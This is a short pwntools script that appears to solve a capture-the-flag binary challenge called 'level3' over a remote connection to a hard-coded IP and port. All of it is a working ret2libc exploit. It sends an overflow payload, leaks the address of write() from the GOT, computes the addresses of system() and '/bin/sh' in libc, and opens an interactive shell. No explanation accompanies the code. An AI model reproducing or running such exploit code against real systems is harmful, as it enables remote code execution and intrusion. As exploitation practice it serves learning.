from pwn import *

if __name__ == '__main__':
    context(os='linux', arch='amd64', log_level='debug')
    elf = ELF("../level3")
    libc = ELF("../libc_32.so.6")

    r = remote('111.200.241.244',55269)
    #r = remote('127.0.0.1',10001)

    vuln_func = 0x0804844B

    payload = b'A'*0x88 + b'_rbp' + p32(elf.symbols['write']) + p32(vuln_func) + p32(1) + p32(elf.got['write']) + p32(4)
    r.sendlineafter("Input:", payload)
    
    r.recvline()
    write_addr_raw = r.recv(4)
    write_addr = u32(write_addr_raw)
    system_addr = write_addr - libc.sym['write'] + libc.sym['system']
    binsh_addr = write_addr - libc.sym['write'] + next(libc.search(b'/bin/sh'))

    payload2 =  b'A'*0x88 + b'_rbp' + p32(system_addr) + p32(0x1) + p32(binsh_addr)
    r.sendlineafter("Input:", payload2)
    r.interactive()
